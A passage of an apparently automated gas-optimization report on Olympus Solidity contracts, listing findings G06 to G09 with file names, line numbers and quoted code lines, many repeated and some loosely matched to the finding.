for (uint256 i = 0; i < reqLength; ) {\r'  ## G06: ++I/I++ SHOULD BE UNCHECKED{++I}/UNCHECKED{I++} WHEN IT IS NOT POSSIBLE FOR THEM TO OVERFLOW, AS IS THE CASE WHEN USED IN FOR- AND WHILE-LOOPS #### problem The unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas per loop #### prof modules/INSTR.sol, 44, b'        uint256 instructionsId = ++totalInstructions;\r' policies/Operator.sol, 488, b'            decimals++;\r' policies/Operator.sol, 675, b'                _status.low.count--;\r' policies/Operator.sol, 670, b'                _status.low.count++;\r' policies/Operator.sol, 691, b'                _status.high.count--;\r' policies/Operator.sol, 686, b'                _status.high.count++;\r'   ### G07: FUNCTIONS GUARANTEED TO REVERT WHEN CALLED BY NORMAL USERS CAN BE MARKED PAYABLE #### problem If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost #### prof policies/Heart.sol, 132, b'    function resetBeat() external onlyRole("heart_admin") ' policies/Heart.sol, 132, b'    function resetBeat() external onlyRole("heart_admin") ' policies/Heart.sol, 137, b'    function toggleBeat() external onlyRole("heart_admin") ' policies/Heart.sol, 137, b'    function toggleBeat() external onlyRole("heart_admin") ' policies/Heart.sol, 147, b'    function setRewardTokenAndAmount(ERC20 token_, uint256 reward_)\r\n        external\r\n        onlyRole("heart_admin")\r\n    ' policies/Heart.sol, 152, b'    function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") ' policies/Heart.sol, 152, b'    function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") ' Kernel.sol, 260, b'    function executeAction(Actions action_, address target_) external onlyExecutor ' Kernel.sol, 448, b'    function grantRole(Role role_, address addr_) public onlyAdmin ' Kernel.sol, 448, b'    function grantRole(Role role_, address addr_) public onlyAdmin ' Kernel.sol, 458, b'    function revokeRole(Role role_, address addr_) public onlyAdmin ' Kernel.sol, 458, b'    function revokeRole(Role role_, address addr_) public onlyAdmin ' policies/Operator.sol, 595, b'    function setBondContracts(IBondAuctioneer auctioneer_, IBondCallback callback_)\r\n        external\r\n        onlyRole("operator_admin")\r\n    ' policies/Operator.sol, 615, b'    function initialize() external onlyRole("operator_admin") ' policies/Operator.sol, 615, b'    function initialize() external onlyRole("operator_admin") ' policies/Operator.sol, 621, b'    function regenerate(bool high_) external onlyRole("operator_admin") ' policies/Operator.sol, 621, b'    function regenerate(bool high_) external onlyRole("operator_admin") ' policies/Operator.sol, 627, b'    function toggleActive() external onlyRole("operator_admin") ' policies/Operator.sol, 627, b'    function toggleActive() external onlyRole("operator_admin") ' policies/PriceConfig.sol, 50, b'    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)\r\n        external\r\n        onlyRole("price_admin")\r\n    ' policies/PriceConfig.sol, 63, b'    function changeMovingAverageDuration(uint48 movingAverageDuration_)\r\n        external\r\n        onlyRole("price_admin")\r\n    ' policies/PriceConfig.sol, 74, b'    function changeObservationFrequency(uint48 observationFrequency_)\r\n        external\r\n        onlyRole("price_admin")\r\n    ' policies/VoterRegistration.sol, 48, b'    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") ' policies/VoterRegistration.sol, 48, b'    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") ' policies/VoterRegistration.sol, 56, b'    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") ' policies/VoterRegistration.sol, 56, b'    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") '   ### G08: USING PRIVATE RATHER THAN PUBLIC FOR CONSTANTS, SAVES GAS #### problem: We can save getter function of public constants. #### prof: policies/Governance.sol, 121, b'    uint256 public constant SUBMISSION_REQUIREMENT = 100;\r' policies/Governance.sol, 124, b'    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;\r' policies/Governance.sol, 127, b'    uint256 public constant GRACE_PERIOD = 1 weeks;\r' policies/Governance.sol, 130, b'    uint256 public constant ENDORSEMENT_THRESHOLD = 20;\r' policies/Governance.sol, 133, b'    uint256 public constant EXECUTION_THRESHOLD = 33;\r' policies/Governance.sol, 137, b'    uint256 public constant EXECUTION_TIMELOCK = 3 days;\r' modules/MINTR.sol, 9, b'    OHM public immutable ohm;\r' policies/Operator.sol, 82, b'    ERC20 public immutable ohm;\r' policies/Operator.sol, 83, b'    uint8 public immutable ohmDecimals;\r' policies/Operator.sol, 85, b'    ERC20 public immutable reserve;\r' policies/Operator.sol, 86, b'    uint8 public immutable reserveDecimals;\r' policies/Operator.sol, 89, b'    uint32 public constant FACTOR_SCALE = 1e4;\r' modules/PRICE.sol, 59, b'    uint8 public constant decimals = 18;' modules/RANGE.sol, 65, b'    uint256 public constant FACTOR_SCALE = 1e4;\r' modules/RANGE.sol, 68, b'    ERC20 public immutable ohm;\r' modules/RANGE.sol, 71, b'    ERC20 public immutable reserve;\r'   ### G09: USAGE OF UINTS/INTS SMALLER THAN 32 BYTES (256 BITS) INCURS OVERHEAD #### problem When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. #### prof policies/Governance.sol, 164, b'        if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT)\r' policies/Governance.sol, 183, b'        if (proposalId_ == 0) {\r' policies/Governance.sol, 188, b'        if (instructions.length == 0) {\r' policies/Governance.sol, 243, b'        if (activeProposal.proposalId == 0) {\r' policies/Governance.sol, 247, b'        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\r' policies/Governance.sol, 268, b'        if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) {\r' policies/Governance.sol, 298, b'        if (userVotes == 0) {\r' policies/Heart.sol, 122, b'        return uint256(PRICE.observationFrequency());\r' policies/Heart.sol, 122, b'        return uint256(PRICE.observationFrequency());\r' modules/INSTR.sol, 29, b'        return (1, 0);\r' modules/INSTR.sol, 48, b'        if (length == 0) revert INSTR_InstructionsCannotBeEmpty();\r' modules/INSTR.sol, 61, b'            } else if (instruction.action == Actions.ChangeExecutor && i != length - 1) {\r' modules/INSTR.sol, 70, b'            instructions.push(instructions_[i]);\r' modules/INSTR.sol, 70, b'            instructions.push(instructions_[i]);\r' Kernel.sol, 133, b'        if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);\r' Kernel.sol, 269, b'        if (address(getModuleForKeycode[keycode]) != address(0))\r' Kernel.sol, 274, b'        allKeycodes.push(keycode);\r' Kernel.sol, 283, b'        if (address(oldModule) == address(0) || oldModule == newModule_)\r' Kernel.sol, 299, b'        activePolicies.push(policy_);\r' Kernel.sol, 309, b'            moduleDependents[keycode].push(policy_);\r' Kernel.sol, 337, b'        activePolicies.pop();\r' Kernel.sol, 397, b'        for (uint256 i = 0; i < reqLength; ) {\r' Kernel.sol, 422, b'            dependents.pop();\r' Kernel.sol, 422, b'            dependents.pop();\r' modules/MINTR.sol, 26, b'        return (1, 0);\r' policies/Operator.sol, 72, b'    OlympusMinter internal MINTR;\r' policies/Operator.sol, 83, b'    uint8 public immutable ohmDecimals;\r' policies/Operator.sol, 86, b'    uint8 public immutable reserveDecimals;\r' policies/Operator.sol, 89, b'    uint32 public constant FACTOR_SCALE = 1e4;\r' policies/Operator.sol, 164, b'        MINTR = OlympusMinter(getModuleAddress(dependencies[3]));\r' policies/Operator.sol, 167, b'        ohm.safeApprove(address(MINTR), type(uint256).max);\r' policies/Operator.sol, 174, b'        Keycode MINTR_KEYCODE = MINTR.KEYCODE();\r' policies/Operator.sol, 202, b'        _updateCapacity(true, 0);\r' policies/Operator.sol, 203, b'        _updateCapacity(false, 0);\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 210, b'            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 211, b'            _status.high.count >= config_.regenThreshold\r' policies/Operator.sol, 211, b'            _status.high.count >= config_.regenThreshold\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 216, b'            uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&\r' policies/Operator.sol, 217, b'            _status.low.count >= config_.regenThreshold\r' policies/Operator.sol, 217, b'            _status.low.count >= config_.regenThreshold\r' policies/Operator.sol, 333, b'            MINTR.mintOhm(msg.sender, amountOut);\r' policies/Operator.sol, 302, b'            MINTR.burnOhm(address(this), amountIn_);\r' policies/Operator.sol, 418, b'            uint8 oracleDecimals = PRICE.decimals();\r' policies/Operator.sol, 418, b'            uint8 oracleDecimals = PRICE.decimals();\r' policies/Operator.sol, 418, b'            uint8 oracleDecimals = PRICE.decimals();\r' policies/Operator.sol, 419, b'            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;\r' policies/Operator.sol, 419, b'            uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;\r' policies/Operator.sol, 420, b'            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;\r' policies/Operator.sol, 420, b'            uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;\r' policies/Operator.sol, 426, b'            int8 priceDecimals = _getPriceDecimals(invCushionPrice);\r' policies/Operator.sol, 426, b'            int8 priceDecimals = _getPriceDecimals(invCushionPrice);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 427, b'            int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 430, b'            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);\r' policies/Operator.sol, 431, b'            uint256 bondScale = 10 **\r' policies/Operator.sol, 434, b'                uint8(\r\n                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r\n                );\r' policies/Operator.sol, 432, b'                uint8(\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 433, b'                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals\r' policies/Operator.sol, 443, b'            uint256 marketCapacity = range.low.capacity.mulDiv(config_.cushionFactor, FACTOR_SCALE);\r' policies/Operator.sol, 443, b'            uint256 marketCapacity = range.low.capacity.mulDiv(config_.cushionFactor, FACTOR_SCALE);\r' policies/Operator.sol, 446, b'            IBondAuctioneer.MarketParams memory params = IBondAuctioneer.MarketParams({\r' policies/Operator.sol, 454, b'                debtBuffer: config_.cushionDebtBuffer,\r' policies/Operator.sol, 455, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 455, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 455, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 456, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 456, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 456, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 457, b'                depositInterval: config_.cushionDepositInterval,\r' policies/Operator.sol, 458, b'                scaleAdjustment: scaleAdjustment\r' policies/Operator.sol, 371, b'            int8 priceDecimals = _getPriceDecimals(range.cushion.high.price);\r' policies/Operator.sol, 371, b'            int8 priceDecimals = _getPriceDecimals(range.cushion.high.price);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 372, b'            int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 375, b'            uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\r' policies/Operator.sol, 376, b'            uint256 bondScale = 10 **\r' policies/Operator.sol, 379, b'                uint8(\r\n                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r\n                );\r' policies/Operator.sol, 377, b'                uint8(\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 378, b'                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\r' policies/Operator.sol, 389, b'                config_.cushionFactor,\r' policies/Operator.sol, 390, b'                FACTOR_SCALE\r' policies/Operator.sol, 394, b'            IBondAuctioneer.MarketParams memory params = IBondAuctioneer.MarketParams({\r' policies/Operator.sol, 402, b'                debtBuffer: config_.cushionDebtBuffer,\r' policies/Operator.sol, 403, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 403, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 403, b'                vesting: uint48(0), // Instant swaps\r' policies/Operator.sol, 404, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 404, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 404, b'                conclusion: uint48(block.timestamp + config_.cushionDuration),\r' policies/Operator.sol, 405, b'                depositInterval: config_.cushionDepositInterval,\r' policies/Operator.sol, 406, b'                scaleAdjustment: scaleAdjustment\r' policies/Operator.sol, 477, b'            RANGE.updateMarket(high_, type(uint256).max, 0);\r' policies/Operator.sol, 485, b'        int8 decimals;\r' policies/Operator.sol, 486, b'        while (price_ >= 10) {\r' policies/Operator.sol, 488, b'            decimals++;\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 493, b'        return decimals - int8(PRICE.decimals());\r' policies/Operator.sol, 518, b'        if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 518, b'        if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 518, b'        if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 518, b'        if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 521, b'        _config.cushionFactor = cushionFactor_;\r' policies/Operator.sol, 533, b'        if (duration_ > uint256(7 days) || duration_ < uint256(1 days))\r' policies/Operator.sol, 533, b'        if (duration_ > uint256(7 days) || duration_ < uint256(1 days))\r' policies/Operator.sol, 533, b'        if (duration_ > uint256(7 days) || duration_ < uint256(1 days))\r' policies/Operator.sol, 533, b'        if (duration_ > uint256(7 days) || duration_ < uint256(1 days))\r' policies/Operator.sol, 535, b'        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();\r' policies/Operator.sol, 535, b'        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();\r' policies/Operator.sol, 535, b'        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();\r' policies/Operator.sol, 535, b'        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 536, b'        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)\r' policies/Operator.sol, 540, b'        _config.cushionDuration = duration_;\r' policies/Operator.sol, 541, b'        _config.cushionDebtBuffer = debtBuffer_;\r' policies/Operator.sol, 542, b'        _config.cushionDepositInterval = depositInterval_;\r' policies/Operator.sol, 550, b'        if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 550, b'        if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 550, b'        if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 550, b'        if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();\r' policies/Operator.sol, 553, b'        _config.reserveFactor = reserveFactor_;\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 565, b'        if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0)\r' policies/Operator.sol, 569, b'        _config.regenWait = wait_;\r' policies/Operator.sol, 570, b'        _config.regenThreshold = threshold_;\r' policies/Operator.sol, 571, b'        _config.regenObserve = observe_;\r' policies/Operator.sol, 574, b'        _status.high.count = 0;\r' policies/Operator.sol, 575, b'        _status.high.nextObservation = 0;\r' policies/Operator.sol, 578, b'        _status.low.count = 0;\r' policies/Operator.sol, 579, b'        _status.low.nextObservation = 0;\r' policies/Operator.sol, 590, b'        if (address(auctioneer_) == address(0) || address(callback_) == address(0))\r' policies/Operator.sol, 590, b'        if (address(auctioneer_) == address(0) || address(callback_) == address(0))\r' policies/Operator.sol, 665, b'        uint32 observe = _config.regenObserve;\r' policies/Operator.sol, 665, b'        uint32 observe = _config.regenObserve;\r' policies/Operator.sol, 675, b'                _status.low.count--;\r' policies/Operator.sol, 670, b'                _status.low.count++;\r' policies/Operator.sol, 678, b'        _status.low.nextObservation = (regen.nextObservation + 1) % observe;\r' policies/Operator.sol, 691, b'                _status.high.count--;\r' policies/Operator.sol, 686, b'                _status.high.count++;\r' policies/Operator.sol, 694, b'        _status.high.nextObservation = (regen.nextObservation + 1) % observe;\r' policies/Operator.sol, 717, b'            _status.low.count = uint32(0);\r' policies/Operator.sol, 719, b'            _status.low.nextObservation = uint32(0);\r' policies/Operator.sol, 720, b'            _status.low.lastRegen = uint48(block.timestamp);\r' policies/Operator.sol, 705, b'            _status.high.count = uint32(0);\r' policies/Operator.sol, 707, b'            _status.high.nextObservation = uint32(0);\r' policies/Operator.sol, 708, b'            _status.high.lastRegen = uint48(block.timestamp);\r' policies/Operator.sol, 764, b'                10**ohmDecimals * 10**PRICE.decimals(),\r' policies/Operator.sol, 764, b'                10**ohmDecimals * 10**PRICE.decimals(),\r' policies/Operator.sol, 764, b'                10**ohmDecimals * 10**PRICE.decimals(),\r' policies/Operator.sol, 764, b'                10**ohmDecimals * 10**PRICE.decimals(),\r' policies/Operator.sol, 764, b'                10**ohmDecimals * 10**PRICE.decimals(),\r' policies/Operator.sol, 765, b'                10**reserveDecimals * RANGE.price(true, true)\r' policies/Operator.sol, 765, b'                10**reserveDecimals * RANGE.price(true, true)\r' policies/Operator.sol, 753, b'                10**reserveDecimals * RANGE.price(true, false),\r' policies/Operator.sol, 753, b'                10**reserveDecimals * RANGE.price(true, false),\r' policies/Operator.sol, 754, b'                10**ohmDecimals * 10**PRICE.decimals()\r' policies/Operator.sol, 754, b'                10**ohmDecimals * 10**PRICE.decimals()\r' policies/Operator.sol, 754, b'                10**ohmDecimals * 10**PRICE.decimals()\r' policies/Operator.sol, 754, b'                10**ohmDecimals * 10**PRICE.decimals()\r' policies/Operator.sol, 754, b'                10**ohmDecimals * 10**PRICE.decimals()\r' policies/Operator.sol, 780, b'        uint256 capacity = (reservesInTreasury * _config.reserveFactor) / FACTOR_SCALE;\r' modules/PRICE.sol, 44, b'    uint32 public nextObsIndex;' modules/PRICE.sol, 47, b'    uint32 public numObservations;' modules/PRICE.sol, 50, b'    uint48 public observationFrequency;' modules/PRICE.sol, 53, b'    uint48 public movingAverageDuration;' modules/PRICE.sol, 56, b'    uint48 public lastObservationTime;' modules/PRICE.sol, 59, b'    uint8 public constant decimals = 18;' modules/PRICE.sol, 114, b'        return (1, 0);' modules/PRICE.sol, 127, b'        uint32 numObs = numObservations;' modules/PRICE.sol, 127, b'        uint32 numObs = numObservations;' modules/PRICE.sol, 143, b'        lastObservationTime = uint48(block.timestamp);' modules/PRICE.sol, 144, b'        nextObsIndex = (nextObsIndex + 1) % numObs;' modules/PRICE.sol, 165, b'            if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))' modules/PRICE.sol, 165, b'            if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))' modules/PRICE.sol, 171, b'            if (updatedAt < block.timestamp - uint256(observationFrequency))' modules/PRICE.sol, 185, b'        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;' modules/PRICE.sol, 185, b'        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;' modules/PRICE.sol, 185, b'        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;' modules/PRICE.sol, 185, b'        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;' modules/PRICE.sol, 215, b'        if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))' modules/PRICE.sol, 215, b'        if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))' modules/PRICE.sol, 215, b'        if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))' modules/PRICE.sol, 221, b'            if (startObservations_[i] == 0) revert Price_InvalidParams();' 